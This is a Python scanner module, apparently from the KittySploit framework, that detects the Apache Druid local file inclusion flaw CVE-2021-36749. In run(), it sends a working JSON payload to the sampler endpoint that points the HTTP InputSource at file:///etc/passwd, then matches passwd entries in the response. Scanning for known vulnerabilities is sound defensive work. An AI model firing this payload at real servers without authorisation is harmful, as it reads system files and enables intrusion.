#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Druid ingestion system is vulnerable to local file inclusion."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Druid - Local File Inclusion Detection',
        'description': 'Apache Druid ingestion system is vulnerable to local file inclusion. The InputSource is used for reading data from a certain data source. However, the HTTP InputSource allows authenticated users to read data from other sources than intended, such as the local file system, with the privileges of the Druid server process. This is not an elevation of privilege when users access Druid directly, since Druid also provides the Local InputSource, which allows the same level of access. But it is problematic when users interact with Druid indirectly through an application that allows users to specify the HTTP InputSource, but not the Local InputSource. In this case, users could bypass the application-level restriction by passing a file URL to the HTTP InputSource. This issue was previously mentioned as being fixed in 0.21.0 as per CVE-2021-26920 but was not fixed in 0.21.0 or 0.21.1.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'apache', 'lfi', 'auth-bypass', 'druid', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/BrucessKING/CVE-2021-36749',
            'https://lists.apache.org/thread.html/rc9400a70d0ec5cdb8a3486fc5ddb0b5282961c0b63e764abfbcb9f5d%40%3Cdev.druid.apache.org%3E',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-36749',
            'https://lists.apache.org/thread.html/r304dfe56a5dfe1b2d9166b24d2c74ad1c6730338b20aef77a00ed2be@%3Cannounce.apache.org%3E',
            'https://lists.apache.org/thread.html/r304dfe56a5dfe1b2d9166b24d2c74ad1c6730338b20aef77a00ed2be%40%3Cannounce.apache.org%3E',
        ],
        'cve': 'CVE-2021-36749',
    }

    def run(self):
        path = '/druid/indexer/v1/sampler?for=connect'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'druid:*:1000:1000:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='medium', reason='Apache Druid - Local File Inclusion detected', path=path)
            return True
        return False

